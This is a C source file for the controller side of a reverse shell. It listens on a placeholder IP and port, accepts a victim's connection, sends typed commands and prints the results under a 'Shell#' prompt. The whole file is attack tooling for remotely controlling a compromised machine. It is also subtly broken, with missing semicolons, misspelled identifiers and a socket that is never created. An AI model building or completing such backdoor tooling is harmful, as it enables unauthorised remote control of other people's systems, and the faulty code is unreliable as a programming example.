#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>

int PORT


int main(){
    int sock, client_socket;
    char buffer[1024];
    char response[20000];

    struct sockaddr_in server_address, client_adrress;
    int option_value = 1;
    socketlen_t client_length;
    if(setsockopt(sock, SOL_SOCKET, SOL_REUSSEADDR,&option_value,sizeof(option_value))< 0){
        printf("Error setting Tcp socket option");
        return 1;
    }
    server_address.sin_family =AF_INET;
    server_address.sin_addr.s_addr = inet_addr("IP");
    server_address.sin_port = htons(PORT);

    bind(sock,(struct sockaddr *)&server_address,sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_adrress);
    client_socket = accept(sock,(struct sockaddr *)&client_adrress, &client_length)
    while(1){
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response,sizeof(response));
        printf("* Shell#%s~$:   ", inet_ntoa(client_adrress.sin_addr));
        fgets(buffer,sizeof(buffer),stdin);
        strok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1) ==0){
            break;
        }
        else if(strncmp("cd ",buffer, 3) ==0){
            goto jump;
        }
        else{
            recv(client_socket,response,sizeof(response),MSG_WAITALL);
            printf("%s",response);
        }

    }
}